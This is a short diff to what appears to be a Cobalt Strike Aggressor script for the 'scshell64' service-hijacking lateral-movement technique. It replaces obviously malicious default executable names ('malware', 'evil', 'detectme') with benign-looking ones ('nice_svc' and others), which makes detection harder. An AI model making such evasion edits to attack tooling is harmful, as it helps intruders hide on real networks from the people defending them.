@@ -65,7 +65,7 @@ beacon_remote_exploit_register("scshell64", "x64", "Use ChangeServiceConfigA to 
 
 # add some defaults
 %scshell_settings["service"] = "defragsvc";
-%scshell_settings["exepath"] = "Windows\\System32\\" . rand(@("malware", "evil", "detectme")) . rand(100) . ".exe";
+%scshell_settings["exepath"] = "Windows\\System32\\" . rand(@("crt_l_test", "cr_tl_test", "nice_svc")) . rand(100) . ".exe";
 %scshell_settings["delay"] = 0;
     
 alias scshell-settings {
